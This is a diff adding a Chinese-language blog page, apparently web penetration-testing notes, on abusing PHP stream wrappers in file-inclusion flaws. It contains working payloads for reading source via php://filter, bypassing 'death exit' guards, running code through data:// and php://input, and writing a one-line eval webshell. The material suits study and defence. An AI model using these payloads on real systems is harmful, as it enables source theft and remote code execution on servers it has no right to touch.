@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>PHP_伪协议 | My New Hugo Site</title>
+<meta name="keywords" content="PHP_伪协议">
+<meta name="description" content="PHP伪协议详解
+php支持的伪协议
+1 file:// — 访问本地文件系统
+2 http:// — 访问 HTTP(s) 网址
+3 ftp:// — 访问 FTP(s) URLs
+4 php:// — 访问各个输入/输出流（I/O streams）
+5 zlib:// — 压缩流
+6 data:// — 数据（RFC 2397）
+7 glob:// — 查找匹配的文件路径模式
+8 phar:// — PHP 归档
+9 ssh2:// — Secure Shell 2
+10 rar:// — RAR
+11 ogg:// — 音频流
+12 expect:// — 处理交互式的流
+1. file://
+示例：
+1.file://[文件的绝对路径和文件名]
+http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
+2.file://[文件的相对路径和文件名]
+http://127.0.0.1/include.php?file=./phpinfo.txt
+3.http://网络位置和文件名
+http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
+2. php://filter
+php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。">
+<meta name="author" content="AuranLu">
+<link rel="canonical" href="http://localhost:1313/posts/auran_lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/php_%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css" integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/auran_lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/php_%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="My New Hugo Site (Alt + H)">My New Hugo Site</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      PHP_伪协议
+    </h1>
+    <div class="post-meta"><span title='2025-03-10 00:00:00 +0000 UTC'>March 10, 2025</span>&nbsp;·&nbsp;AuranLu
+
+</div>
+  </header> 
+  <div class="post-content"><p>PHP伪协议详解
+php支持的伪协议</p>
+<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">1 file:// — 访问本地文件系统
+2 http:// — 访问 HTTP(s) 网址
+3 ftp:// — 访问 FTP(s) URLs
+4 php:// — 访问各个输入/输出流（I/O streams）
+5 zlib:// — 压缩流
+6 data:// — 数据（RFC 2397）
+7 glob:// — 查找匹配的文件路径模式
+8 phar:// — PHP 归档
+9 ssh2:// — Secure Shell 2
+10 rar:// — RAR
+11 ogg:// — 音频流
+12 expect:// — 处理交互式的流
+</code></pre><h2 id="1-file">1. file://<a hidden class="anchor" aria-hidden="true" href="#1-file">#</a></h2>
+<p>示例：</p>
+<p>1.file://[文件的绝对路径和文件名]</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cobol" data-lang="cobol"><span style="display:flex;"><span><span style="color:#75715e">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
+</span></span></span></code></pre></div><p>2.file://[文件的相对路径和文件名]</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cobol" data-lang="cobol"><span style="display:flex;"><span><span style="color:#75715e">http://127.0.0.1/include.php?file=./phpinfo.txt
+</span></span></span></code></pre></div><p>3.http://网络位置和文件名</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cobol" data-lang="cobol"><span style="display:flex;"><span><span style="color:#75715e">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
+</span></span></span></code></pre></div><h2 id="2-phpfilter">2. php://filter<a hidden class="anchor" aria-hidden="true" href="#2-phpfilter">#</a></h2>
+<p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
+<p>简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。</p>
+<p>php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</p>
+<p>协议参数</p>
+<table>
+  <thead>
+      <tr>
+          <th>名称</th>
+          <th>描述</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>resource=&lt;要过滤的数据流&gt;</td>
+          <td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
+      </tr>
+      <tr>
+          <td>read=&lt;读链的筛选列表&gt;</td>
+          <td>该参数可选。可以设定一个或多个过滤器名称，以管道符（</td>
+      </tr>
+      <tr>
+          <td>write=&lt;写链的筛选列表&gt;</td>
+          <td>该参数可选。可以设定一个或多个过滤器名称，以管道符（</td>
+      </tr>
+      <tr>
+          <td>&lt;；两个链的筛选列表&gt;</td>
+          <td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td>
+      </tr>
+  </tbody>
+</table>
+<p>​
+常用：</p>
+<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">php://filter/read=convert.base64-encode/resource=index.php
+php://filter/resource=index.php
+</code></pre><p>利用filter协议读文件±，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。</p>
+<p>而使用的convert.base64-encode，就是一种过滤器。</p>
+<p>过滤器
+字符串过滤器
+该类通常以string开头，对每个字符都进行同样方式的处理。</p>
+<p>string.rot13</p>
+<p>一种字符处理方式，字符右移十三位。</p>
+<p>string.toupper</p>
+<p>将所有字符转换为大写。</p>
+<p>string.tolower</p>
+<p>将所有字符转换为小写。</p>
+<p>string.strip_tags
+这个过滤器就比较有意思，用来处理掉读入的所有标签，例如XML的等等。在绕过死亡exit大有用处。</p>
+<p>转换过滤器
+对数据流进行编码，通常用来读取文件源码。</p>
+<p>convert.base64-encode &amp; convert.base64-decode</p>
+<p>base64加密解密</p>
+<p>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</p>
+<p>可以翻译为可打印字符引用编码，使用可以打印的ASCII编码的字符表示各种编码形式下的字符。</p>
+<p>压缩过滤器
+注意，这里的压缩过滤器指的并不是在数据流传入的时候对整个数据进行写入文件后压缩文件，也不代表可以压缩或者解压数据流。压缩过滤器不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</p>
+<p>用到的两个相关过滤器：zlib.deflate（压缩）和 zlib.inflate（解压）。zilb是比较主流的用法，至于bzip2.compress和 bzip2.decompress工作的方式与 zlib 过滤器大致相同。</p>
+<p>加密过滤器
+mcrypt.*和 mdecrypt.*使用 libmcrypt 提供了对称的加密和解密。</p>
+<p>更多妙用：https://www.leavesongs.com/PENETRATION/php-filter-magic.html</p>
+<p>利用filter伪协议绕过死亡exit
+什么是死亡exit
+死亡exit指的是在进行写入PHP文件操作时，执行了以下函数：</p>
+<pre tabindex="0"><code>file_put_contents($content, &#39;&lt;?php exit();&#39; . $content);亦或者
+</code></pre><pre tabindex="0"><code>file_put_contents($content, &#39;&lt;?php exit();?&gt;&#39; . $content);
+</code></pre><p>这样，当你插入一句话木马时，文件的内容是这样子的：</p>
+<pre tabindex="0"><code>&lt;?php exit();?&gt;
+
+&lt;?php @eval($_POST[&#39;snakin&#39;]);?&gt;
+</code></pre><p>这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配置文件等等不允许用户直接访问的文件当中。</p>
+<p>base64decode绕过
+利用filter协议来绕过，看下这样的代码：</p>
+<pre tabindex="0"><code>&lt;?php
+
+$content = &#39;&lt;?php exit; ?&gt;&#39;;
+
+$content .= $_POST[&#39;txt&#39;];
+
+file_put_contents($_POST[&#39;filename&#39;], $content);
+</code></pre><p>当用户通过POST方式提交一个数据时，会与死亡exit进行拼接，从而避免提交的数据被执行。</p>
+<p>然而这里可以利用php://filter的base64-decode方法，将$content解码，利用php base64_decode函数特性去除死亡exit。</p>
+<p>base64编码中只包含64个可打印字符，当PHP遇到不可解码的字符时，会选择性的跳过，这个时候base64就相当于以下的过程：</p>
+<pre tabindex="0"><code>&lt;?php
+
+$_GET[&#39;txt&#39;] = preg_replace(&#39;|[^a-z0-9A-Z+/]|s&#39;, &#39;&#39;, $_GET[&#39;txt&#39;]);
+
+base64_decode($_GET[&#39;txt&#39;]);
+</code></pre><p>所以，当$content 包含 <?php exit; ?>时，解码过程会先去除识别不了的字符，&lt; ; ? &gt;和空格等都将被去除，于是剩下的字符就只有phpexit以及我们传入的字符了。由于base64是4个byte一组，再添加一个字符例如添加字符’a’后，将’phpexita’当做两组base64进行解码，也就绕过这个死亡exit了。</p>
+<p>这个时候后面再加上编码后的一句话木马，就可以getshell了。</p>
+<p>strip_tags绕过
+这个<?php exit; ?>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</p>
+<p>但是我们要写入的一句话木马也是XML标签，在用到strip_tags时也会被去除。</p>
+<p>注意到在写入文件的时候，filter是支持多个过滤器的。可以先将webshell经过base64编码，strip_tags去除死亡exit之后，再通过base64-decode复原。</p>
+<pre tabindex="0"><code>php://filter/string.strip_tags|convert.base64-decode/resource=shell.php
+</code></pre><p>更多绕过方法：file_put_content和死亡·杂糅代码之缘</p>
+<h2 id="3-data">3. data://<a hidden class="anchor" aria-hidden="true" href="#3-data">#</a></h2>
+<p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。</p>
+<p>示例用法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#a6e22e">、data</span><span style="color:#f92672">://</span><span style="color:#a6e22e">text</span><span style="color:#f92672">/</span><span style="color:#a6e22e">plain</span>,
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#ae81ff">127.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.1</span><span style="color:#f92672">/</span><span style="color:#66d9ef">include</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span><span style="color:#f92672">?</span><span style="color:#a6e22e">file</span><span style="color:#f92672">=</span><span style="color:#a6e22e">data</span><span style="color:#f92672">://</span><span style="color:#a6e22e">text</span><span style="color:#f92672">/</span><span style="color:#a6e22e">plain</span>,<span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span><span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#a6e22e">phpinfo</span>();<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">2、data://text/plain;base64,
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+</span></span></span></code></pre></div><p>范例
+Example #1 打印 data:// 的内容</p>
+<pre tabindex="0"><code>&lt;?php
+// 打印 &#34;I love PHP&#34;
+echo  file_get_contents ( &#39;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#39; );
+?&gt;
+</code></pre><p>Example #2 获取媒体类型</p>
+<pre tabindex="0"><code>&lt;?php
+$fp    =  fopen ( &#39;data://text/plain;base64,&#39; ,  &#39;r&#39; );
+$meta  =  stream_get_meta_data ( $fp );
+
+// 打印 &#34;text/plain&#34;
+echo  $meta [ &#39;mediatype&#39; ];
+?&gt;
+</code></pre><h2 id="4-phpinput">4. php://input<a hidden class="anchor" aria-hidden="true" href="#4-phpinput">#</a></h2>
+<p>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p>
+<p>php://input的使用</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#ae81ff">127.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.1</span><span style="color:#f92672">/</span><span style="color:#66d9ef">include</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span><span style="color:#f92672">?</span><span style="color:#a6e22e">file</span><span style="color:#f92672">=</span><span style="color:#a6e22e">php</span><span style="color:#f92672">://</span><span style="color:#a6e22e">input</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">DATA部分</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">phpinfo</span>(); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>写入一句话木马</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">http</span><span style="color:#f92672">://</span><span style="color:#ae81ff">127.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.1</span><span style="color:#f92672">/</span><span style="color:#66d9ef">include</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span><span style="color:#f92672">?</span><span style="color:#a6e22e">file</span><span style="color:#f92672">=</span><span style="color:#a6e22e">php</span><span style="color:#f92672">://</span><span style="color:#a6e22e">input</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">DATA部分</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">fputs</span>(<span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#39;1juhua.php&#39;</span>,<span style="color:#e6db74">&#39;w&#39;</span>),<span style="color:#e6db74">&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;</span>); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>例如：
+http://127.0.0.1/cmd.php?cmd=php://input
+POST数据：<?php phpinfo()?>
+注意：
+当enctype=&ldquo;multipart/form-data&quot;的时候 php://input` 是无效的</p>
+<p>遇到file_get_contents()要想到用php://input绕过。</p>
+<h2 id="5-zipbzipzlib-协议">5. zip://bzip://zlib:// 协议<a hidden class="anchor" aria-hidden="true" href="#5-zipbzipzlib-协议">#</a></h2>
+<p>作用：</p>
+<p>zip:// &amp; bzip:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可以修改为任意后缀名，如 jpg，png，gif，xxx等</p>
+<p>示例：</p>
+<p><strong>1.zip://[压缩文件绝对路径]%23[压缩文件内的子文件文件名](# 的编码为 %23)</strong></p>
+<p>压缩 phpinfo.txt 为phpinfo.zip ,压缩包重命名为 phpinfo.jpg ,并上传</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cobol" data-lang="cobol"><span style="display:flex;"><span><span style="color:#75715e">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt
+</span></span></span></code></pre></div><p><strong>2.compress.bzip2://file.bz2</strong></p>
+<p>压缩phpinfo.txt 为phpinfo.bz2 并上传（同样支持任意后缀名)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cobol" data-lang="cobol"><span style="display:flex;"><span><span style="color:#75715e">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2
+</span></span></span></code></pre></div><p>3.compress.zlib://file.gz</p>
+<p>压缩phpinfo.txt 为phpinfo.gz 并上传（支持任意后缀名）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cobol" data-lang="cobol"><span style="display:flex;"><span><span style="color:#75715e">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz
+</span></span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/php_%E4%BC%AA%E5%8D%8F%E8%AE%AE/">PHP_伪协议</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">My New Hugo Site</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
